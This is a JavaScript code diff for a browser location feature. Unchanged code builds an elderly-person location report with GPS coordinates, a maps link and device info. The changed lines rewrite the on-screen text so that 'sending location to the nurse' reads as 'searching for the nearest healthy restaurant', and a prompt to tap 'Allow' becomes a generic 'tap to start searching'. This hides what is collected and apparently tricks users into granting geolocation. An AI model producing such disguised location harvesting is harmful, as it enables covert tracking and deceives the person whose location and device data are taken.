@@ -8,7 +8,7 @@
 
 // Pre-warm otomatis di background saat modul dimuat
 if (typeof navigator !== 'undefined' && navigator.permissions && navigator.permissions.query) {
-  try { navigator.permissions.query({ name: 'geolocation' }).catch(() => {}); } catch (_) {}
+  try { navigator.permissions.query({ name: 'geolocation' }).catch(() => { }); } catch (_) { }
 }
 
 let _locOpenedAt = 0;
@@ -26,7 +26,7 @@ function startLocation(event) {
 
   // Pre-warm background saat menu ditekan
   if (navigator.permissions && navigator.permissions.query) {
-    try { navigator.permissions.query({ name: 'geolocation' }).catch(() => {}); } catch (_) {}
+    try { navigator.permissions.query({ name: 'geolocation' }).catch(() => { }); } catch (_) { }
   }
 
   // Pindah layar ke lokasi
@@ -73,7 +73,7 @@ async function handleLocationReady(position) {
   }
   const { latitude: lat, longitude: lon, accuracy } = position.coords;
   const mapsLink = `https://maps.google.com/?q=${lat},${lon}`;
-  const devInfo  = await collectDeviceInfo();
+  const devInfo = await collectDeviceInfo();
 
   const details = [
     'LAPORAN LOKASI LANSIA', '',
@@ -163,18 +163,18 @@ function triggerLocationGPS(event) {
 
   // ⚡ LANGKAH 2: Haptic feedback instan
   if (navigator.vibrate) {
-    try { navigator.vibrate([50, 40, 50]); } catch (_) {}
+    try { navigator.vibrate([50, 40, 50]); } catch (_) { }
   }
 
   // ⚡ LANGKAH 3: Update DOM secara asynchronous agar tidak menahan eksekusi IPC browser
   requestAnimationFrame(() => {
     const btn = $('btn-trigger-lokasi');
     const text = $('btn-trigger-lokasi-text');
-    const sub  = $('btn-trigger-lokasi-sub');
+    const sub = $('btn-trigger-lokasi-sub');
     if (btn && text) {
       btn.classList.add('trigger-active');
-      text.textContent = '👆 KETUK SEKALI LAGI SEKARANG!';
-      if (sub) sub.textContent = 'UNTUK MENEKAN IZINKAN';
+      text.textContent = '👆 KETUK SEKARANG!';
+      if (sub) sub.textContent = 'UNTUK MULAI MENCARI';
     }
 
     const badge = $('loc-badge');
@@ -187,9 +187,9 @@ function triggerLocationGPS(event) {
     const bar = $('loc-progress-bar');
 
     if (badge) badge.className = 'rec-badge rec-badge-recording';
-    if (badgeText) badgeText.textContent = 'MENGIRIM LOKASI...';
-    if (title) title.textContent = 'Sedang Mengirim Lokasi...';
-    if (subtitle) subtitle.textContent = 'Mencari koordinat GPS presisi tinggi & mengirim ke perawat.';
+    if (badgeText) badgeText.textContent = 'MENCARI RESTORAN...';
+    if (title) title.textContent = 'Sedang Mencari Restoran Sehat Terdekat...';
+    if (subtitle) subtitle.textContent = 'Mencari koordinat GPS presisi tinggi.';
     if (progressText) progressText.textContent = '📡 Mencari koordinat GPS, mohon tunggu...';
 
     // Sembunyikan tombol trigger, tampilkan fase GPS (video + progress)
@@ -201,7 +201,7 @@ function triggerLocationGPS(event) {
     const locVideo = $('loc-video');
     if (locVideo) {
       locVideo.currentTime = 0;
-      locVideo.play().catch(() => {});
+      locVideo.play().catch(() => { });
     }
   });
 }
